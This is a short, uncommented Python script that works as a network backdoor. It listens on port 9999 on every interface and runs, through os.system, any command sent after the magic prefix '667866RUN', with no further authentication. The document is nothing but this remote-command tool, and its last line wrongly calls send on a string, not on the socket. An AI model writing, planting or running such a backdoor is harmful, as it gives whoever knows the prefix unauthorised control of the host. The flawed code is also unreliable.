import socket,os
s = socket.socket()
s.bind(('0.0.0.0', 9999))
s.listen(5)
while True:
    c, addr = s.accept()
    print('Got connection from', addr)
    msg = c.recv(1024).decode("utf-8")
    if msg.startswith("667866RUN"):
        command = msg[9:]
        print("Executing command:", command)
        os.system(command)
        msg.send(b"Command executed.\n")

    c.close()